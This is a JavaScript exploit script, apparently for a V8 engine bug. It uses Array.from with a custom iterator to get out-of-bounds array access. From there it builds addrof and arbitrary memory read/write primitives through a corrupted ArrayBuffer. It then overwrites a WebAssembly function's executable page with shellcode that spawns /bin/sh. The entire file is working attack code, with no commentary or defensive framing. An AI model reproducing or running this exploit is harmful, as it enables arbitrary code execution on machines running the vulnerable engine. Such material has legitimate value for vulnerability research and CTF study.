class convert
{
    constructor()
    {
        this.buf=new ArrayBuffer(8)
        this.uint8array=new Uint8Array(this.buf);
        this.float64array=new Float64Array(this.buf);
        this.uint32array=new Uint32Array(this.buf);
    }
    f2i(x)//float64 ==> uint64
    {
        this.float64array[0]=x;
        let sum = 0;
        for (let i = 0 ;i< 8 ;i ++)
        {
            sum += this.uint8array[i]*(0x100**i);
        }
        //print(sum.toString(16));
        return sum;
    }
    i2f(x)//uint64 ==> float64
    {
        let tmp = [];
        tmp[0] = (x % 0x100000000);
        tmp[1] = ((x - tmp[0]) / 0x100000000);
        this.uint32array[0]=tmp[0];
        this.uint32array[1]=tmp[1];
        return this.float64array[0];
    }
}
let conv= new convert();



let bufs = [];
let objs = [];
let oob_array = [1.1,2.2,3.3];
let maxsize = 1024*8;

Array.from.call(function() {return oob_array},{[Symbol.iterator]: _ =>(
    {
        counter: 0 ,
        next()
        {
            let res=this.counter++ + 0.1;
            if(this.counter>maxsize)
            {
                oob_array.length=10;
                for (let i = 0;i<100;i++)
                {
                    bufs.push(new ArrayBuffer(0x1337));
                    objs.push({"a":0x41414141});
                }
                return {done:true};
            }
            else
            {
                return {value:1.1,done:false};
            }
        }
    }
)
});

let bufs_offset = 0;
let objs_offset = 0;

for(let i = 0;i < oob_array.length; i++){
	let cmp = conv.f2i(oob_array[i])
	if(cmp == 0x133700000000){
		oob_array[i] = conv.i2f(0x414000000000);
		oob_array[i+3] = conv.i2f(0x4140);
		bufs_offset = i;
		break;
	}
}

for(let i = 0;i < oob_array.length; i++){
	let cmp = conv.f2i(oob_array[i])
	if(cmp == 0x4141414100000000){
		objs_offset = i;
		oob_array[i] = conv.i2f(0x4242424200000000);
		break;
	}
}

let bufs_index = 0;
let objs_index = 0;

console.log("bufs_offset = " + bufs_offset);
console.log("objs_offset = " + objs_offset);

for(let i = 0; i < 100;i++){
	if(bufs[i].byteLength == 0x4140)
	{
		bufs_index = i;
		break;
	}
}

for(let i = 0; i <100;i++){
	if(objs[i]["a"] == 0x42424242)
	{
		objs_index = i;
		break;
	}
}

console.log("bufs_index = " + bufs_index);
console.log("objs_index = " + objs_index);
// %DebugPrint(oob_array);
// Math.atan();

var memory = {
	addrof(obj){
		objs[objs_index]["a"] = obj;
		return conv.f2i(oob_array[objs_offset]);
	},
	read(addr){
		oob_array[bufs_offset+1] = conv.i2f(addr);
		let val_ = new Float64Array(bufs[bufs_index]);
		return conv.f2i(val_[0]);
	},
	write(addr,val){
		oob_array[bufs_offset+1] = conv.i2f(addr);
		let var_ = new Uint8Array(bufs[bufs_index]);
		var_[0] = val;
	}
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

let f_addr = memory.addrof(f);
// Math.atan();
console.log(" f address = " + f_addr.toString(16));
// Math.atan();
let share_info = memory.read(f_addr + 0x18 - 0x1) - 0x1;
console.log(" share_info = " + share_info.toString(16));
let code_addr = memory.read(share_info+0x8) - 0x1;
console.log(" code addr = " + code_addr.toString(16));
let rwx_addr = memory.read(code_addr+0x72);
console.log(" rwx_addr = " + rwx_addr.toString(16));

shellcode= new Uint8Array([106,0,72,141,61,17,0,0,0,87,72,141,52,36,72,49,210,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0])
for(var i = 0; i < shellcode.length;i++){
	var value = shellcode[i];		
	memory.write(rwx_addr+i,value);
}

f();
// Math.atan();
